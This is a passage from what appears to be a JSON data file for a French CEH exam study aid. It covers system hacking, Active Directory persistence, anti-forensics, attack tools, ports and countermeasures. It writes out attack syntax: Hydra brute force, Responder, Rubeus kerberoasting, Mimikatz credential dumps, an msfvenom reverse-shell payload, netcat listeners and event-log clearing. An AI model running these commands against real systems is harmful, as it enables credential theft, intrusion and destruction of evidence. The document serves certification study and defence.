 l'allocation de mémoire et l'exécution du code injecté. Une variante Meterpreter consiste à migrer la session dans un autre processus."},{"name":"PowerShell & fileless execution","desc":"PowerShell est un langage de scripting orienté objets très puissant, présent par défaut sur de nombreux systèmes Windows. Il peut exécuter du code directement en mémoire sans déposer de binaire classique. Cette caractéristique le rend utile pour LOTL, mais ses commandes et scripts peuvent être journalisés et analysés par les défenses modernes."},{"name":"Empire","desc":"Empire est un framework de post-exploitation basé historiquement sur PowerShell. Il fournit agents, C2 et modules pour des actions telles que credential access, persistence ou privilege escalation après compromission. Il illustre l'utilisation offensive d'un outil de scripting natif comme canal de post-exploitation."}]},{"g":"Hiding, Rootkits & Steganography","items":[{"name":"Keylogger","desc":"Un keylogger enregistre les frappes clavier et peut récupérer identifiants, mots de passe, conversations ou autres données saisies. Il peut être matériel — placé entre le clavier et la machine ou intégré au périphérique — ou logiciel, à différents niveaux de l'OS. Un keylogger matériel échappe aux protections logicielles classiques mais peut être découvert physiquement.","cheat":[{"words":1,"title":"Types","rows":[["Hardware","PC/BIOS embedded, keyboard logger, PS/2/USB, acoustic/CAM, Bluetooth, Wi-Fi"],["Software","application, kernel, hypervisor, form grabbing, JavaScript, memory injection"]]}]},{"name":"Spyware","desc":"Un spyware surveille l'activité d'un utilisateur et transmet des informations sans son consentement. Il peut collecter l'historique web, des captures d'écran, du contenu e-mail ou du presse-papiers, activer micro/webcam, rediriger le navigateur ou affaiblir les paramètres de sécurité."},{"name":"Rootkit","desc":"Un rootkit vise à conserver un accès privilégié tout en dissimulant sa présence. Plutôt que seulement exécuter du code, il modifie ce que le système montre aux utilisateurs et outils : processus, fichiers, modules ou connexions peuvent être filtrés ou remplacés afin de masquer l'activité de l'attaquant."},{"name":"Types de Rootkits","desc":"Les rootkits sont classés selon la couche où ils s'insèrent. Plus ils opèrent bas dans la pile, plus ils peuvent contrôler ce que l'OS voit et plus leur détection devient difficile.","cheat":[{"words":1,"title":"Classification","rows":[["Hypervisor-Level","Ring -1 ; intercepte l'OS via virtualisation"],["Hardware/Firmware","BIOS, disque, carte réseau ou firmware"],["Kernel-Level","Ring 0 ; driver/module noyau"],["Boot-Loader-Level","bootkit actif avant le chargement de l'OS"],["Application/User-Mode","Ring 3 ; remplace ou patch des binaries/applications"],["Library-Level","hooks/remplace des appels système via bibliothèques"],["Memory Rootkit","réside uniquement en RAM ; pas de trace disque persistante"]]}],"exam":"Hypervisor rootkit = Ring -1 ; Kernel rootkit = Ring 0 ; User-mode = Ring 3."},{"name":"System Hooking","desc":"Le system hooking modifie le chemin d'appel d'une fonction afin qu'un composant contrôlé par le rootkit soit exécuté à la place ou avant la fonction légitime. L'inline hooking modifie directement les octets d'une fonction dans des DLL système, alors que d'autres hooks remplacent des pointeurs ou entrées de tables."},{"name":"NTFS Alternate Data Streams (ADS)","desc":"NTFS permet à un fichier de posséder plusieurs flux de données. Le flux principal est visible normalement ; un alternate data stream peut contenir des données supplémentaires sans modifier ce que l'utilisateur voit dans l'Explorateur ni la taille affichée du flux principal. Cette capacité peut être détournée pour cacher outils ou contenu malveillant.","exam":"ADS = NTFS uniquement. Copier vers un système de fichiers FAT supprime les streams alternatifs."},{"name":"Steganography","desc":"La stéganographie cache l'existence d'un message en l'insérant dans un support apparemment banal. Contrairement au chiffrement, où l'on voit qu'un contenu secret existe mais ne peut pas le lire, le but est ici que l'observateur ne remarque même pas qu'un message est présent."},{"name":"LSB Insertion","desc":"Least-Significant-Bit insertion cache des bits du message dans les bits de poids faible des valeurs de pixels d'une image. Modifier ces bits change très peu la couleur affichée, ce qui permet de transporter des données sans modification visuelle évidente du support."},{"name":"Steganalysis","desc":"La steganalysis cherche à détecter ou extraire un contenu caché. Les techniques varient selon ce que l'analyste connaît déjà : seulement le stego-object, le cover original, le message, l'algorithme ou différentes combinaisons. Des analyses statistiques comme chi-square cherchent des anomalies introduites par l'encodage.","cheat":[{"words":1,"title":"Attaques","rows":[["Stego-only","seul l'objet suspect est disponible"],["Known-stego","algorithme + cover + stego-object connus"],["Known-message","message + stego-object connus"],["Known-cover","comparaison cover original / stego-object"],["Chosen-message","générer des objets à partir d'un message connu"],["Chosen-stego","stego-object + algorithme connus"],["Chi-square","analyse probabiliste/statistique"],["Blind classifier","apprentissage sur des données originales pour détecter des différences"]]}]}]},{"g":"Active Directory — Domain Dominance","items":[{"name":"Domain Dominance","desc":"Domain dominance regroupe des techniques de post-exploitation visant à conserver un contrôle durable sur un domaine Active Directory. Une fois des privilèges élevés obtenus, l'attaquant cherche des mécanismes qui lui permettront de ré-obtenir un accès même si un compte ou un mot de passe est modifié."},{"name":"Golden Ticket","desc":"Un Golden Ticket est un faux TGT Kerberos créé après compromission du secret du compte KRBTGT. Comme ce compte signe les TGT du domaine, connaître son hash permet de forger des tickets acceptés par le KDC et d'obtenir un contrôle très large sur le domaine jusqu'à rotation effective du secret KRBTGT.","flow":"Obtenir domaine + SID → récupérer le secret KRBTGT (ex. DCSync) → forger un TGT → l'utiliser comme identité privilégiée","exam":"Golden Ticket = TGT forgé + KRBTGT hash + portée domaine."},{"name":"Silver Ticket","desc":"Un Silver Ticket forge un TGS pour un service particulier à partir du hash du compte de service correspondant. Il ne nécessite pas le secret KRBTGT et possède donc une portée plus limitée : le ticket falsifié permet d'accéder au service ciblé plutôt qu'à l'ensemble du domaine.","cheat":[{"words":1,"title":"Golden vs Silver","rows":[["Golden","forge TGT ; secret KRBTGT ; contrôle large du domaine"],["Silver","forge TGS ; secret du service account ; limité au service visé"]]}],"exam":"Silver = TGS/service account ; Golden = TGT/KRBTGT."},{"name":"Skeleton Key","desc":"Skeleton Key est une technique de persistence en mémoire sur un contrôleur de domaine qui ajoute un mot de passe maître accepté en parallèle des mots de passe légitimes. Les utilisateurs continuent donc à s'authentifier normalement tandis que l'attaquant possède une seconde clé d'accès discrète."},{"name":"DCSync","desc":"DCSync abuse des fonctions de réplication Active Directory pour demander au contrôleur de domaine des données de credentials comme si l'attaquant était un autre DC autorisé. Le module l'utilise dans le scénario Golden Ticket pour récupérer le secret du compte KRBTGT."},{"name":"DPAPI Abuse","desc":"DPAPI protège des secrets Windows à l'aide de clés liées aux comptes et au domaine. Dans un environnement Active Directory, des clés de domaine permettent la récupération de certaines données protégées. Un attaquant ayant compromis suffisamment de privilèges peut chercher ces clés pour déchiffrer des secrets DPAPI et renforcer sa persistance."},{"name":"BloodHound Attack Paths","desc":"BloodHound représente Active Directory sous forme de graphe afin de révéler des relations difficiles à voir manuellement : membres de groupes, droits, sessions, délégations, comptes Kerberoastable ou chemins vers Domain Admins. L'objectif est d'identifier le chemin de privilèges le plus court ou le plus réaliste entre un compte compromis et une cible importante."}]},{"g":"Clearing Tracks & Anti-Forensics","items":[{"name":"Clearing Tracks","desc":"La phase de clearing tracks cherche à réduire les traces de la compromission : logs, fichiers, artefacts d'exécution, historiques ou métadonnées. La suppression totale de journaux est très visible ; une stratégie plus discrète peut tenter de modifier seulement les traces pertinentes, mais des copies centralisées dans un SIEM peuvent déjà exister hors de la machine compromise."},{"name":"Windows Event Logs","desc":"Windows enregistre de nombreuses actions dans des journaux Application, System, Security et des logs spécialisés. Des commandes comme wevtutil ou Clear-EventLog peuvent effacer un journal lorsque les droits le permettent. Meterpreter propose aussi clearev, qui cible les principaux logs Windows.","exam":"Clearev efface Application/System/Security dans le scénario Meterpreter du cours ; nécessite un niveau de privilège élevé."},{"name":"Linux Logs","desc":"Sous Linux, de nombreux journaux résident sous /var/log. Leur suppression ou modification exige généralement des privilèges élevés. Si les événements sont envoyés à distance vers un serveur syslog/SIEM, supprimer les fichiers locaux ne retire pas la copie distante."},{"name":"Disable Last Access Timestamp","desc":"Le timestamp d'accès indique qu'un fichier a été lu. Désactiver sa mise à jour réduit un artefact exploitable en forensic. Windows fournit un paramètre fsutil pour modifier ce comportement ; cette technique relève de l'anti-forensics car elle cherche à empêcher la création future de traces."},{"name":"Prefetch & Thumbnail Cache","desc":"Windows Prefetch et le cache de thumbnails conservent des traces permettant de reconstruire l'utilisation de programmes ou l'affichage de fichiers. Désactiver ces fonctions ou supprimer leurs artefacts vise à réduire l'information disponible pour un analyste forensic."},{"name":"Timestomping","desc":"Le timestomping modifie les dates Created/Modified/Accessed d'un fichier afin qu'il s'intègre mieux au contexte du système. Un exemple Meterpreter copie les timestamps d'un fichier Windows légitime vers un fichier déposé par l'attaquant, ce qui rend l'artefact moins évident dans une timeline forensic."},{"name":"Hiding Files","desc":"Sous Windows, des fichiers peuvent être dissimulés dans des répertoires peu visibles ou via ADS. Sous Linux, les fichiers et dossiers commençant par un point sont cachés par les affichages standards de ls. Cacher n'efface cependant pas l'artefact : un outil forensic ou une recherche ciblée peut toujours le retrouver."},{"name":"HTTP / ICMP / DNS Tunneling","desc":"Un tunnel transporte des données dans un protocole qui paraît légitime ou qui traverse déjà le périmètre. HTTP tunneling encapsule les communications dans des requêtes web, ICMP tunneling utilise echo/reply comme transport et DNS tunneling encode des données dans des requêtes/réponses DNS pour former un backchannel ou exfiltrer des informations."},{"name":"TCP Parameter Covert Channel","desc":"Un covert channel peut aussi cacher des bits dans certains champs de protocoles plutôt que dans le payload visible. Le module cite notamment l'utilisation de paramètres TCP/IP tels que l'Identification field pour transmettre progressivement des données dans des paquets qui ressemblent à du trafic normal."}]}]},"outil":{"groups":[{"g":"Password Cracking & Credential Access","items":[{"name":"John the Ripper","desc":"Cracker de mots de passe offline. Il travaille sur un fichier de hashes déjà récupéré. Le mode single utilise les informations du compte et des règles ; le mode wordlist teste une liste de candidats ; le mode incremental effectue un brute force plus exhaustif. Sous Linux, unshadow fusionne /etc/passwd et /etc/shadow dans un format exploitable par John.","syntax":"john --wordlist=<wordlist> --rules --stdout > <custom.txt>\njohn --rules --wordlist=<custom.txt> --format=NT <ntlm_hashes.txt>\nunshadow passwd.local shadow.local > combined.txt\njohn --wordlist=rockyou.txt combined.txt\njohn --incremental combined.txt","cheat":[{"words":1,"title":"Modes","rows":[["Single","informations du compte + mangling rules"],["Wordlist","teste chaque mot d'une liste"],["Incremental","brute force du keyspace"]]}]},{"name":"Hashcat","desc":"Outil de cracking offline cité pour les hashes Windows et les tickets Kerberos récupérés. Il exploite généralement une forte parallélisation et peut utiliser GPU/CPU selon l'environnement. Les supports fournis l'associent notamment au cracking des données AS-REP/Kerberoasting, mais ne détaillent pas ici une syntaxe complète à mémoriser."},{"name":"Hydra / THC-Hydra","desc":"Outil d'attaque online contre des services d'authentification. Les options montrées permettent de choisir un utilisateur unique ou une liste d'utilisateurs, et un mot de passe unique ou une liste de mots de passe. La combinaison choisie détermine si l'on fait plutôt du guessing, du spraying ou un brute-force plus large.","syntax":"hydra -l admin -p password ftp://<target>/\nhydra -L default_logins.txt -p test ftp://<target>/\nhydra -l admin -P common_passwords.txt ftp://<target>/\nhydra -L logins.txt -P passwords.txt ftp://<target>/","cheat":[{"words":1,"title":"Options importantes","rows":[["-l","un login"],["-L","fichier de logins"],["-p","un password"],["-P","fichier de passwords"]]}]},{"name":"Responder","desc":"Outil utilisé pour empoisonner les mécanismes de résolution locaux LLMNR/NBT-NS et capturer les réponses d'authentification NTLMv2-SSP envoyées par les victimes. Il doit écouter sur l'interface réseau connectée au segment où circulent les broadcasts.","syntax":"sudo responder -I eth0","cheat":[{"words":1,"title":"Option","rows":[["-I <interface>","interface réseau d'écoute"]]}]},{"name":"Rubeus","desc":"Outil Windows spécialisé Kerberos. Les commandes citées permettent de demander un TGT puis d'identifier/récupérer des tickets de service crackables pour Kerberoasting. Il peut travailler avec un username/password ou d'autres formes de credentials selon le scénario.","syntax":"Rubeus.exe asktgt /user:<u> /password:<p> /domain:<d> /dc:<ip>\nRubeus.exe kerberoast /user:<u> /domain:<d> /dc:<ip>\nRubeus.exe kerberoast /outfile:hash.txt","cheat":[{"words":1,"title":"Paramètres vus","rows":[["asktgt","demander un TGT"],["kerberoast","chercher/récupérer les tickets de services"],["/user:","compte utilisé"],["/password:","password du compte"],["/domain:","domaine AD"],["/dc:","adresse du Domain Controller"],["/outfile:","écrire les tickets/hash dans un fichier"]]}]},{"name":"RainbowCrack — rtgen / rtsort / rcrack","desc":"Suite de rainbow tables. rtgen génère une table pour un algorithme, un charset et une longueur de mot de passe ; rtsort trie les tables avant utilisation ; rcrack effectue la recherche du hash dans les tables générées.","syntax":"rtgen md5 loweralpha-numeric 5 8 0 3800 33554432 0\nrtsort .\nrcrack . -lm password.txt","cheat":[{"words":1,"title":"rtgen — paramètres","rows":[["md5","algorithme de hash"],["loweralpha-numeric","charset"],["5 / 8","longueur min / max"],["0","index de fonction de réduction"],["3800","longueur de chaîne"],["33554432","nombre de chaînes"],["dernier 0","part de table"]]},{"words":1,"title":"rcrack","rows":[[".","répertoire contenant les tables"],["-lm","le fichier cible contient des hashes LM"]]}]},{"name":"pwdump7","desc":"Utilitaire cité pour extraire les password hashes Windows. Son intérêt dans la chaîne d'attaque est la récupération des hashes avant leur traitement par un cracker offline."},{"name":"Mimikatz / Kiwi","desc":"Mimikatz vise l'accès aux secrets Windows, notamment en mémoire. Dans Meterpreter, l'ancien module 'mimikatz' a été renommé/actualisé en 'kiwi'. Les commandes kiwi citées récupèrent différents types de credentials ou secrets LSA/SAM lorsqu'une session suffisamment privilégiée est disponible.","syntax":"meterpreter> load kiwi\nmeterpreter> creds_all\nmeterpreter> creds_msv\nmeterpreter> creds_kerberos\nmeterpreter> lsa_dump_sam\nmeterpreter> lsa_dump_secrets","cheat":[{"words":1,"title":"Commandes","rows":[["creds_all","récupération globale"],["creds_msv","credentials/NTLM via MSV"],["creds_kerberos","credentials Kerberos"],["lsa_dump_sam","dump SAM"],["lsa_dump_secrets","dump LSA secrets"]]}]},{"name":"hashID","desc":"Outil cité pour identifier le type probable d'un hash. Cette étape est utile avant de choisir le mode ou le format d'un cracker, car un hash mal identifié conduit à lancer le mauvais algorithme de cracking."},{"name":"Patator / BruteX / Brutus","desc":"Outils de brute force cités dans le module comme alternatives pour automatiser des attaques de credentials sur différents protocoles ou services. Ils servent surtout à reconnaître la catégorie d'outil plutôt qu'une syntaxe précise dans les supports fournis."}]},{"g":"Exploit Development & Frameworks","items":[{"name":"Exploit-DB","desc":"Archive publique d'exploits et de Proofs of Concept. Elle permet de chercher un code existant après avoir identifié la vulnérabilité, puis de l'étudier ou l'adapter à la cible. Le code doit toujours être validé avant utilisation dans un environnement autorisé."},{"name":"searchsploit","desc":"Interface CLI offline d'Exploit-DB installée sur Kali. Elle interroge la copie locale des exploits et shellcodes, ce qui permet de retrouver rapidement un PoC sans passer par le navigateur.","syntax":"searchsploit OpenSSH\nsearchsploit \"eternal blue\"","exam":"searchsploit = recherche offline d'Exploit-DB ; les fichiers se trouvent sous /usr/share/exploitdb/."},{"name":"Metasploit Framework","desc":"Framework d'exploitation et de post-exploitation. Le workflow standard consiste à rechercher un module, le charger, examiner ses options, renseigner la cible puis l'exécuter. Les modules auxiliary peuvent scanner ; les exploits déclenchent une faille ; les payloads définissent l'action post-exploitation ; les post modules opèrent après compromission.","syntax":"msfconsole\nsearch <vuln> type:exploit\nuse <module>\nshow options\nset RHOSTS <target>\nexploit   # ou run","cheat":[{"words":1,"title":"Options/variables","rows":[["search","chercher un module"],["type:exploit","filtrer la recherche"],["use","charger un module"],["show options","afficher paramètres et valeurs manquantes"],["RHOST/RHOSTS","cible distante"],["LHOST/LPORT","listener local pour callback"],["exploit / run","lancer le module"]]}]},{"name":"multi/handler","desc":"Module Metasploit qui écoute les connexions de retour d'un payload déjà exécuté sur une cible. Il est indispensable lorsqu'un exploit externe ou un exécutable généré déclenche une reverse shell/Meterpreter sans que le module d'exploitation lui-même ne gère le listener.","syntax":"use exploit/multi/handler\nset LHOST <your IP>\nset LPORT <your port>\nexploit","exam":"RHOST = remote target ; LHOST/LPORT = adresse/port local du listener."},{"name":"Meterpreter","desc":"Shell de post-exploitation intégré à Metasploit. Il fournit des commandes abstraites permettant d'interagir avec le système, récupérer des informations, gérer les sessions, pivoter, charger kiwi, effectuer des actions de persistence ou migrer dans un autre processus selon les modules disponibles.","syntax":"sysinfo\nhashdump\nload kiwi\nshell\nipconfig\nbackground\nsessions\nclearev"},{"name":"msfvenom","desc":"Générateur de payloads Metasploit. Le support montre la création d'un exécutable Meterpreter reverse_tcp avec choix du payload, LHOST/LPORT, format de sortie, architecture, encoder et nombre d'itérations.","syntax":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o payload.exe","cheat":[{"words":1,"title":"Options importantes","rows":[["-p","payload"],["LHOST/LPORT","destination du callback"],["-f","format de sortie"],["-e","encoder"],["-a","architecture"],["-i","nombre d'itérations d'encodage"],["-o","fichier de sortie"]]}]},{"name":"Netcat","desc":"Outil de connexion et d'écoute TCP/UDP. Dans le contexte du module, il sert à établir des connexions simples vers des services lors d'un exploit ou à écouter une reverse shell.","syntax":"nc -nv <Target IP> <Target Port>\nnetcat -lvnp 5555","cheat":[{"words":1,"title":"Options montrées","rows":[["-n","ne pas résoudre les noms"],["-v","verbose"],["-l","listen"],["-p","port local"],["combinaison -lvnp","listener verbeux sans résolution sur un port donné"]]}]},{"name":"Immunity Debugger + mona.py","desc":"Debugger Windows utilisé dans le scénario de buffer overflow pour observer le crash, vérifier EIP/ESP, comparer les bad characters et rechercher les modules exploitables. mona.py automatise plusieurs tâches d'analyse du process et de ses protections.","syntax":"!mona modules","exam":"!mona modules = examiner les modules et leurs protections pour choisir un module adapté."},{"name":"Peach Fuzzer","desc":"Framework de fuzzing réseau et fichiers basé sur des définitions XML. Les éléments principaux sont Data Model, State Model, Publisher et Logger ; ils décrivent respectivement le format des données, la logique des échanges, le transport et la collecte des résultats.","syntax":"peach.exe samples\\http.xml"},{"name":"AFL / afl-fuzz","desc":"American Fuzzy Lop est un fuzzer de formats de fichiers, généralement coverage-guided. Le mode montré fournit un dossier d'inputs à muter, un dossier de sortie pour les résultats/crashes et un timeout par exécution.","syntax":"afl-fuzz -t 100000 -n -i pdfs -o pdf-results","cheat":[{"words":1,"title":"Options","rows":[["-t 100000","timeout par run en ms"],["-n","mode sans instrumentation guidance"],["-i pdfs","dossier d'inputs"],["-o pdf-results","dossier de résultats/crashes"]]}]},{"name":"sfuzz","desc":"Fuzzer disponible sous Kali qui utilise notamment des templates de protocole. Le support cite un template basic.smtp pour envoyer des variations de messages à un serveur e-mail."}]},{"g":"Privilege Escalation & Active Directory","items":[{"name":"BloodHound","desc":"Outil de cartographie Active Directory utilisant la théorie des graphes pour mettre en évidence les relations et chemins d'attaque entre comptes, groupes, machines et privilèges. Il sert notamment à rechercher le chemin vers Domain Admins et à identifier des comptes Kerberoastable ou AS-REP roastable."},{"name":"Certipy","desc":"Outil utilisé pour analyser Active Directory Certificate Services et rechercher des templates ou configurations de certificat vulnérables. La commande montrée cible un domaine avec un compte valide et demande uniquement les configurations vulnérables et actives.","syntax":"certipy find -u '<user>@<domain>' -p <password> -dc-ip <DC_IP> -vulnerable -enabled","cheat":[{"words":1,"title":"Options montrées","rows":[["find","mode de recherche ADCS"],["-u","utilisateur"],["-p","password"],["-dc-ip","IP du Domain Controller"],["-vulnerable","filtrer les configurations vulnérables"],["-enabled","uniquement les éléments activés"]]}]},{"name":"pwncat","desc":"Shell et framework post-exploitation qui peut analyser des chemins d'escalade de privilèges. Le support montre la liste des escalations disponibles pour n'importe quel utilisateur ou une cible précise, puis leur exécution.","syntax":"pwncat$ escalate list\npwncat$ escalate list -u root\npwncat$ escalate run","cheat":[{"words":1,"title":"Sous-commandes","rows":[["escalate list","lister les chemins d'escalade"],["-u root","cibler un utilisateur précis"],["escalate run","exécuter une escalation sélectionnée"]]}]},{"name":"PowerSploit","desc":"Collection de modules PowerShell offensifs citée pour la post-exploitation et certaines techniques d'élévation. Elle n'est plus maintenue mais reste utile à reconnaître dans les questions d'outils CEH."},{"name":"Spartacus","desc":"Outil cité pour identifier des opportunités de DLL hijacking sous Windows. Il aide à repérer les applications qui cherchent des DLL dans des emplacements contrôlables par un utilisateur."},{"name":"windows-exploit-suggester.py","desc":"Script qui compare les informations de patch d'un système Windows à une base de bulletins pour suggérer des exploits locaux potentiels. Le workflow consiste à récupérer systeminfo, mettre à jour la base, puis analyser le fichier collecté.","syntax":"systeminfo > patches.txt\n./windows-exploit-suggester.py --update\n./windows-exploit-suggester.py -i patches.txt -d <mssb.xls> -l","cheat":[{"words":1,"title":"Options","rows":[["--update","mettre à jour la base de bulletins"],["-i","fichier systeminfo/patches"],["-d","base de données XLS"],["-l","afficher la liste de résultats"]]}]},{"name":"linprivchecker.py","desc":"Script cité pour aider à collecter les informations d'un système Linux utiles à la recherche de privilege escalation : version du kernel, configurations et autres indices de faiblesse locale."},{"name":"Empire","desc":"Framework de post-exploitation/C2 qui exploite PowerShell et propose des modules pour credential access, persistence et privilege escalation. Il est aussi cité dans le scénario Skeleton Key."}]},{"g":"Persistence, Hiding & Forensics","items":[{"name":"Streams (Sysinternals)","desc":"Utilitaire Microsoft Sysinternals cité pour détecter les NTFS Alternate Data Streams associés aux fichiers. Il permet de révéler les streams cachés qui ne sont pas visibles dans l'Explorateur classique."},{"name":"GMER","desc":"Outil de détection de rootkits et également cité pour repérer des Alternate Data Streams. Il recherche des hooks, processus, modules ou artefacts cachés associés à des techniques de dissimulation."},{"name":"TDSSKiller / Malwarebytes Anti-Rootkit / Stinger","desc":"Outils anti-rootkit cités pour rechercher et supprimer des familles de rootkits. Dans la carte, l'important est d'associer cette catégorie à la détection et remédiation de rootkits, pas à la création d'un accès."},{"name":"zsteg","desc":"Outil de steganalysis spécialisé dans la détection de données cachées dans des images PNG/BMP, notamment via les bits de poids faible et variantes d'encodage."},{"name":"StegoVeritas","desc":"Outil de steganalysis cité pour automatiser l'examen d'images et rechercher différents types d'artefacts ou contenus cachés."},{"name":"Clear-EventLog","desc":"Cmdlet PowerShell permettant d'effacer un ou plusieurs journaux Windows lorsque l'utilisateur possède les permissions nécessaires.","syntax":"Clear-EventLog \"Windows PowerShell\"\nClear-EventLog -LogName ODiag,OSession -ComputerName localhost,Server02\nClear-EventLog -LogName application,system -confirm"},{"name":"wevtutil","desc":"Outil CLI Windows de gestion des Event Logs. L'opération 'cl' (clear-log) efface le journal spécifié.","syntax":"wevtutil cl <log name>","cheat":[{"words":1,"title":"Sous-commande","rows":[["cl","clear-log : effacer le journal nommé"]]}]},{"name":"fsutil","desc":"Outil Windows utilisé ici pour modifier le comportement du timestamp Last Access. La valeur 1 désactive la mise à jour du last access ; 0 la réactive.","syntax":"fsutil behavior set disablelastaccess 1","cheat":[{"words":1,"title":"Valeurs","rows":[["1","désactiver Last Access update"],["0","réactiver"]]}]}]}]},"port":{"groups":[{"g":"Ports liés aux attaques de mots de passe","items":[{"name":"21/TCP — FTP","desc":"Le module cite FTP comme service fréquemment visé par password spraying ou attaques online de credentials.","exam":"FTP control = TCP 21."},{"name":"22/TCP — SSH","desc":"SSH est cité parmi les services ciblés par password spraying.","exam":"SSH = TCP 22."},{"name":"23/TCP — Telnet","desc":"Telnet est cité comme cible de password spraying et reste un protocole en clair à éviter.","exam":"Telnet = TCP 23."},{"name":"88/TCP — Kerberos","desc":"Kerberos est cité comme service visé dans les attaques de mots de passe Active Directory.","exam":"Kerberos = TCP 88 dans la liste de spraying du module."},{"name":"445/TCP — SMB","desc":"SMB est un service d'authentification Windows souvent utilisé pour tester des credentials ou effectuer du mouvement latéral.","exam":"SMB direct = TCP 445."},{"name":"1433/TCP — MSSQL","desc":"Microsoft SQL Server est cité comme cible fréquente de password spraying.","exam":"MSSQL = TCP 1433."}]},{"g":"Protocoles & flux utiles en post-exploitation","items":[{"name":"Kerberos — AS/TGS/AP","desc":"Flux logique de tickets utilisé par Active Directory : AS pour obtenir un TGT, TGS pour obtenir un ticket de service, AP pour présenter ce ticket au service."},{"name":"LLMNR / NBT-NS","desc":"Protocoles de résolution locale dont les requêtes broadcast/multicast peuvent être empoisonnées sur un LAN afin de provoquer une authentification NTLMv2 vers l'attaquant."},{"name":"HTTP tunneling","desc":"Utilise des requêtes/réponses HTTP comme transport d'un canal caché afin de se fondre dans du trafic web généralement autorisé."},{"name":"ICMP tunneling","desc":"Utilise les messages ICMP echo/reply comme conteneur pour transporter des données de contrôle ou d'exfiltration."},{"name":"DNS tunneling","desc":"Encode des données dans des requêtes/réponses DNS afin de créer un canal de commande ou d'exfiltration dans un protocole souvent autorisé."}]}]},"contre":{"groups":[{"g":"Passwords & Authentication","items":[{"name":"Désactiver LM / NTLM si inutile","desc":"Réduire l'usage des mécanismes d'authentification anciens lorsque l'environnement permet de s'appuyer sur des mécanismes plus modernes."},{"name":"Désactiver LLMNR / NBT-NS","desc":"Supprimer les mécanismes de résolution locale inutiles afin d'empêcher les scénarios de poisoning qui capturent des réponses NTLMv2."},{"name":"Account Lockout Policy","desc":"Configurer un seuil, une fenêtre de compteur et une durée de verrouillage afin de limiter les attaques online de password guessing et brute force."},{"name":"Strong Password Policy","desc":"Imposer des secrets robustes via Group Policy et effectuer des audits périodiques de mots de passe pour identifier les choix faibles ou réutilisés."},{"name":"MFA / 2FA","desc":"Ajouter un second facteur afin qu'un mot de passe compromis ne suffise pas à obtenir l'accès au compte."},{"name":"Éviter les protocoles cleartext","desc":"Ne pas transmettre de credentials via des protocoles non chiffrés ou des mécanismes faibles ; privilégier les protocoles sécurisés."},{"name":"Physical Security","desc":"Empêcher l'accès physique non autorisé aux machines et supports afin de réduire les attaques offline et le déploiement de keyloggers matériels."},{"name":"Monitoring des échecs d'authentification","desc":"Surveiller les logs et événements d'échec, notamment les patterns distribués d'un password spraying qui peuvent être moins visibles qu'un brute force concentré."}]},{"g":"Privilege Escalation & Hardening","items":[{"name":"Least Privilege","desc":"Attribuer uniquement les droits nécessaires réduit l'impact d'un compte compromis et limite les chemins d'élévation."},{"name":"RBAC","desc":"Utiliser Role-Based Access Control pour aligner les privilèges sur des rôles métier plutôt que d'accumuler des droits individuels."},{"name":"JIT Privileged Access","desc":"Accorder les privilèges élevés uniquement pour une durée limitée au moment où ils sont nécessaires, au lieu de maintenir des comptes administratifs permanents."},{"name":"Audit ACLs & Service Permissions","desc":"Revoir régulièrement les permissions de fichiers, dossiers, services et objets afin d'éliminer les write permissions qui permettraient un hijacking ou une modification de configuration."},{"name":"Application Whitelisting / Code Signing","desc":"Limiter l'exécution à des programmes autorisés et vérifier la signature du code réduit les opportunités de lancer une DLL ou un binaire arbitraire."},{"name":"Patch OS / Firmware / Apps","desc":"Maintenir à jour les composants système réduit les possibilités d'exploits locaux de kernel ou de logiciels privilégiés."},{"name":"Sudo Hardening","desc":"Limiter les commandes sudo, éviter les règles d'exécution arbitraire, séparer les comptes et réduire le cache de credentials avec timestamp_timeout adapté."},{"name":"Centraliser les logs privilégiés","desc":"Enregistrer et centraliser les connexions et actions administratives afin qu'une tentative d'escalade ou d'abus reste visible même si la machine est ensuite manipulée."},{"name":"Zero Trust","desc":"Ne pas accorder implicitement la confiance sur la base de la position réseau ou d'un accès antérieur ; vérifier identité, appareil et contexte pour chaque accès sensible."}]},{"g":"Rootkits, ADS & Malware Hiding","items":[{"name":"Réinstallation depuis une source de confiance","desc":"Pour un rootkit profondément implanté, la remédiation la plus sûre consiste souvent à reconstruire le système depuis des médias fiables après sauvegarde des données nécessaires."},{"name":"File Integrity Monitoring","desc":"Comparer régulièrement les fichiers système à des empreintes cryptographiques de référence permet de détecter remplacement, hooking ou modification de binaries critiques."},{"name":"Anti-Rootkit / AV à jour","desc":"Maintenir des outils capables d'analyser drivers, hooks et autres artefacts utilisés par les rootkits."},{"name":"Trusted Restoration Media","desc":"Conserver des médias et procédures de restauration vérifiés permet de réinstaller sans réintroduire les composants compromis."},{"name":"Détecter les ADS","desc":"Utiliser des outils comme Streams, GMER ou un file-integrity checker pour rechercher les Alternate Data Streams cachés."},{"name":"Déplacer vers FAT pour supprimer ADS","desc":"Un fichier copié vers un système de fichiers ne supportant pas les ADS perd ses streams alternatifs, ce qui peut aider à neutraliser ce mécanisme de dissimulation."},{"name":"Éviter les droits admin permanents","desc":"Travailler en compte standard réduit la capacité d'un malware ou rootkit à s'installer dans le kernel, les services ou des zones système protégées."}]},{"g":"Covering Tracks — détection & résilience des logs","items":[{"name":"Activer la journalisation","desc":"Les systèmes critiques doivent journaliser les événements nécessaires à l'investigation ; sans logs, l'attaquant peut agir avec beaucoup moins de traces exploitables."},{"name":"Centraliser les logs","desc":"Envoyer les logs vers un serveur séparé/SIEM crée une copie hors de la machine compromise. Une suppression locale ne suffit alors plus à faire disparaître l'historique."},{"name":"Append-Only / Immutable Logging","desc":"Configurer les journaux pour empêcher la modification ou suppression non autorisée réduit l'efficacité du covering tracks."},{"name":"Permissions minimales sur les logs","desc":"Limiter strictement les droits d'écriture et de suppression sur les fichiers de logs afin que seuls les composants autorisés puissent les modifier."},{"name":"Ne pas écraser les anciens événements","desc":"Prévoir suffisamment de stockage et une politique de rotation adaptée pour éviter que l'attaquant puisse simplement générer du bruit jusqu'à faire disparaître les événements antérieurs."},{"name":"Backups vers média non altérable","desc":"Sauvegarder périodiquement les logs sur un support indépendant ou non modifiable protège les preuves contre une compromission ultérieure de la machine source."},{"name":"Audits réguliers des logs","desc":"Vérifier périodiquement que la journalisation respecte bien la politique et que les sources importantes arrivent réellement au système central."},{"name":"Réduire ports/services inutiles","desc":"Moins de services exposés signifie moins de vecteurs de compromission et donc moins d'occasions pour un attaquant d'atteindre la phase de persistence/covering tracks."}]}]}}},{"n":7,"t":"Menaces de malwares","data":{"concept":{"groups":[{"g":"Fondamentaux du malware","items":[{"name":"Malware — définition","desc":"Un malware est un logiciel malveillant conçu pour endommager, perturber ou prendre le contrôle d’un 